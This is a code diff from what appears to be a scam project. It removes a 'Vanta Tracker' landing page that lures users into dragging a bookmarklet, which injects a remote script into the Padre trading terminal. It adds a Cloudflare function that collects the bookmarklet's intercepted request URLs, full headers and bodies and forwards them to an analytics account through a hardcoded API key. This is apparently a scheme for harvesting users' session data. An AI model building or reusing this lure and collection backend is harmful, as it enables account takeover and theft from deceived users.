@@ -1,69 +1,64 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vanta Tracker - Premier Twitter Tracker for Padre</title>
-    <link rel="icon" href="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg" type="image/png">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
-    <style>
-        :root { --primary: #00ff88; --bg-dark: #0a0a0a; --text-muted: #aaaaaa; }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Inter', sans-serif; background: var(--bg-dark); color: #fff; overflow-x: hidden; }
-        canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.3; }
-        header { text-align: center; padding: 80px 20px; border-bottom: 2px solid var(--primary); background: linear-gradient(180deg, #000, #001a0d); }
-        .logo { width: 120px; filter: drop-shadow(0 0 10px var(--primary)); margin-bottom: 20px; }
-        h1 { font-size: 3em; color: var(--primary); text-transform: uppercase; letter-spacing: 2px; }
-        .setup-section { padding: 60px 20px; max-width: 900px; margin: 0 auto; text-align: center; }
-        .cta-button { 
-            display: inline-block; background: var(--primary); color: #000; padding: 18px 40px; 
-            text-decoration: none; border-radius: 8px; font-weight: 800; font-size: 1.2em; 
-            margin-top: 30px; box-shadow: 0 0 20px rgba(0,255,136,0.5); transition: 0.3s;
-            cursor: move;
+// File: /api/log/index.js
+export async function onRequestPost(context) {
+    const { request, env } = context;
+
+    // Your Amplitude API Key
+    const AMPLITUDE_API_KEY = '3c8ae1f40635939e730f479418940796';
+    const AMPLITUDE_ENDPOINT = 'https://api2.amplitude.com/2/httpapi';
+
+    try {
+        // 1. Get the data sent from the bookmarklet
+        const requestData = await request.json();
+
+        // 2. Prepare the event for Amplitude
+        // We'll create a generic event for any intercepted data
+        const amplitudeEvent = {
+            user_id: requestData.interceptedUserId || 'anonymous_user', // Use a user ID if available
+            event_type: 'Intercepted Bookmarklet Data',
+            event_properties: {
+                interceptedUrl: requestData.interceptedUrl,
+                interceptedMethod: requestData.interceptedMethod,
+                interceptedHeaders: JSON.stringify(requestData.interceptedHeaders),
+                interceptedBody: requestData.interceptedBody, // The actual data payload
+                userAgent: request.headers.get('User-Agent'),
+                timestamp: new Date().toISOString()
+            }
+        };
+
+        // 3. Send the event to Amplitude
+        const amplitudeResponse = await fetch(AMPLITUDE_ENDPOINT, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Accept': '*/*'
+            },
+            body: JSON.stringify({
+                api_key: AMPLITUDE_API_KEY,
+                events: [amplitudeEvent]
+            })
+        });
+
+        if (!amplitudeResponse.ok) {
+            const errorText = await amplitudeResponse.text();
+            console.error('Failed to send to Amplitude:', errorText);
+            // Return an error, but don't expose internal details to the client
+            return new Response(JSON.stringify({ success: false, error: 'Failed to log to analytics' }), {
+                status: 500,
+                headers: { 'Content-Type': 'application/json' },
+            });
         }
-        .cta-button:hover { transform: scale(1.05); background: #fff; }
-        ol { text-align: left; display: inline-block; margin: 20px 0; color: var(--text-muted); }
-        li { margin-bottom: 10px; }
-        strong { color: var(--primary); }
-    </style>
-</head>
-<body>
-    <canvas id="canvas"></canvas>
-    <header>
-        <svg class="logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M50 8 L78 25 L78 75 L50 92 L22 75 L22 25 Z" stroke="var(--primary)" stroke-width="3"/>
-            <circle cx="50" cy="50" r="8" fill="var(--primary)"><animate attributeName="r" values="8;10;8" dur="2s" repeatCount="indefinite"/></circle>
-        </svg>
-        <h1>Vanta Tracker</h1>
-        <p>Advanced Twitter API tracking for Padre terminal.</p>
-    </header>
 
-    <section class="setup-section">
-        <h2>Installation</h2>
-        <ol>
-            <li>Enable your Bookmarks Bar (<strong>Ctrl+Shift+B</strong>).</li>
-            <li>Drag the <strong>Vanta Tracker</strong> button below to your bar.</li>
-            <li>Open your <strong>Padre Terminal</strong>.</li>
-            <li>Click the bookmark to initialize the tracking engine.</li>
-        </ol>
-        <br>
-        <a href="#" class="cta-button" id="vanta-trigger">VANTA TRACKER</a>
-    </section>
+        // 4. Send a success response back to the bookmarklet
+        return new Response(JSON.stringify({ success: true, message: 'Data logged successfully' }), {
+            status: 200,
+            headers: { 'Content-Type': 'application/json' },
+        });
 
-    <script>
-        const params = new URLSearchParams(window.location.search);
-        const aff = params.get('aff') || 'TK0XQV';
-        const engineUrl = "https://vanta-9bz.pages.dev/engine.js";
-
-        // This is the 1:1 Injector Logic
-        const bookmarkletCode = `javascript:(function(){
-            window.VantaAff='${aff}';
-            const s=document.createElement('script');
-            s.src='${engineUrl}?v='+Date.now();
-            document.body.appendChild(s);
-        })();`.replace(/\s+/g, '');
-        
-        document.getElementById('vanta-trigger').href = bookmarkletCode;
-    </script>
-</body>
-</html>
+    } catch (err) {
+        console.error('Error in Cloudflare Function:', err);
+        return new Response(JSON.stringify({ success: false, error: 'Internal server error' }), {
+            status: 500,
+            headers: { 'Content-Type': 'application/json' },
+        });
+    }
+}
